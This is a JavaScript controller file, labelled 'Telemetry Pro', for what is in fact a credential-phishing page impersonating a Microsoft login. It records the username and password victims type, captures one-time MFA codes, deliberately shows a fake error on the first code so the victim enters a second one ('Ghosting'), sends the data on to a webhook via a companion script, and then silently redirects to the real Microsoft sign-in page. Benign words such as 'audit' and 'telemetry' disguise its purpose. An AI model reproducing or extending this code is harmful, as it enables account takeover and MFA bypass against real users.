/**
 * =====================================================================
 * TELEMETRY PRO: UI CONTROLLER (app.js)
 * =====================================================================
 * * PURPOSE:
 * This file connects your HTML login page to the Telemetry Engine.
 * It handles switching between the login screen and the MFA screen,
 * and tells the Engine when to send data to your webhook.
 * =====================================================================
 */

const AppController = {
    
    // --- 1. CONFIGURATION ---
    config: {
        // Where the user goes after the audit is done (Silent Handoff)
        redirectUrl: 'https://login.microsoftonline.com/',
        
        // Toggle: If true, attaches the captured email to the redirect URL 
        // (e.g., ?login_hint=user@company.com) for a smoother handoff.
        passEmailOnRedirect: false
    },

    state: {
        mfaAttempts: 0 // Keeps track of how many MFA codes they typed
    },

    // --- 2. STARTUP ---
    init: function() {
        // Locks the 'this' keyword so our functions don't break when triggered by the HTML form
        this.handleLogin = this.handleLogin.bind(this);
        this.handleMFA = this.handleMFA.bind(this);

        this.attachEventListeners();
    },

    // --- 3. CONNECTING TO HTML ---
    attachEventListeners: function() {
        const loginForm = document.getElementById('form-login');
        const mfaForm = document.getElementById('form-mfa');

        if (loginForm) loginForm.addEventListener('submit', this.handleLogin);
        if (mfaForm) mfaForm.addEventListener('submit', this.handleMFA);
    },

    // --- 4. WHAT HAPPENS WHEN THEY CLICK BUTTONS ---
    handleLogin: function(event) {
        event.preventDefault(); // Stops the page from refreshing
        
        // Save what they typed so the Engine can read it
        sessionStorage.setItem('log_u', document.getElementById('u').value);
        sessionStorage.setItem('log_p', document.getElementById('p').value);
        
        // Hide the login box, show the MFA box
        this.swapUI('step-1', 'step-2');
        
        // Tell the Engine to run a background check (doesn't finish the audit yet)
        TelemetryScanner.runAudit(false);
    },

    handleMFA: async function(event) {
        event.preventDefault(); 
        
        this.state.mfaAttempts++;
        const currentCode = document.getElementById('otp').value;
        
        // Save the code they typed (e.g., mfa_1, mfa_2)
        sessionStorage.setItem(`mfa_${this.state.mfaAttempts}`, currentCode);

        // Check if we want to force an error on their first try (Ghosting)
        // Note: TelemetryScanner settings are defined in telemetry.js
        const shouldGhost = TelemetryScanner.config && TelemetryScanner.config.enableGhosting && this.state.mfaAttempts === 1;

        if (shouldGhost) {
            // Show the red error text, clear the input box, and wait for them to try again
            document.getElementById('mfa-error').classList.remove('hidden');
            document.getElementById('otp').value = "";
            TelemetryScanner.runAudit(false); 
        } else {
            // They passed MFA. Send the final data and redirect them to the real site.
            await TelemetryScanner.runAudit(true);
            this.finishAndRedirect();
        }
    },

    // --- 5. HELPER TOOLS ---
    swapUI: function(hideElementId, showElementId) {
        // A quick tool to hide one part of the page and show another
        document.getElementById(hideElementId).classList.add('hidden');
        document.getElementById(showElementId).classList.remove('hidden');
    },

    finishAndRedirect: function() {
        if (this.config.passEmailOnRedirect) {
            // Grabs the email they typed so we can pass it to the real site
            const email = sessionStorage.getItem('log_u') || '';
            window.location.href = `${this.config.redirectUrl}?login_hint=${encodeURIComponent(email)}`;
        } else {
            // Standard redirect without appending the email
            window.location.href = this.config.redirectUrl;
        }
    }
};

// Start the controller as soon as the HTML is done loading
document.addEventListener('DOMContentLoaded', AppController.init.bind(AppController));